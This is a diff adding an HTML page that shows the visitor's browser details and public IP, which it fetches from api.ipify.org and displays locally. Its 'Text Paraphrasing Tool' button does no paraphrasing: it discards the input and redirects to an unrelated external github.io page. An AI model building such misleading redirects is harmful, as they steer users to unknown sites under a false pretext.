@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser System Configuration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        h1 {
+            color: #0056b3;
+        }
+        .info {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #fff;
+        }
+        .tool {
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #fff;
+        }
+        .tool input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .tool button {
+            padding: 10px 20px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .tool button:hover {
+            background-color: #004494;
+        }
+    </style>
+</head>
+<body>
+    <h1>Browser System Configuration</h1>
+
+    <div class="tool">
+        <h2>Text Paraphrasing Tool</h2>
+        <input type="text" id="inputText" placeholder="Enter text to paraphrase...">
+        <button onclick="redirectToLink()">Paraphrase</button>
+    </div>
+
+    <div id="info" class="info">
+        <p>Loading system configuration...</p>
+    </div>
+
+    <script>
+        // Collect browser and system configuration details
+        const systemInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            onlineStatus: navigator.onLine ? "Online" : "Offline",
+            screenResolution: `${window.screen.width} x ${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
+        };
+
+        // Render the collected information into the HTML
+        const infoDiv = document.getElementById("info");
+        infoDiv.innerHTML = `
+            <ul>
+                <li><strong>User Agent:</strong> ${systemInfo.userAgent}</li>
+                <li><strong>Platform:</strong> ${systemInfo.platform}</li>
+                <li><strong>Language:</strong> ${systemInfo.language}</li>
+                <li><strong>Online Status:</strong> ${systemInfo.onlineStatus}</li>
+                <li><strong>Screen Resolution:</strong> ${systemInfo.screenResolution}</li>
+                <li><strong>Color Depth:</strong> ${systemInfo.colorDepth}</li>
+            </ul>
+        `;
+
+        // Fetch public IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipItem = document.createElement('li');
+                ipItem.innerHTML = `<strong>Public IP Address:</strong> ${data.ip}`;
+                infoDiv.querySelector('ul').appendChild(ipItem);
+            })
+            .catch(error => {
+                console.error('Error fetching public IP:', error);
+                const ipItem = document.createElement('li');
+                ipItem.innerHTML = `<strong>Public IP Address:</strong> Unable to fetch`;
+                infoDiv.querySelector('ul').appendChild(ipItem);
+            });
+
+        // Redirect to a specific link
+        function redirectToLink() {
+            const inputText = document.getElementById('inputText').value;
+            const encodedText = encodeURIComponent(inputText);
+            const link = `https://paexternalj.github.io/pharaphrasetoolconfirm/`;
+            window.location.href = link;
+        }
+    </script>
+</body>
+</html>
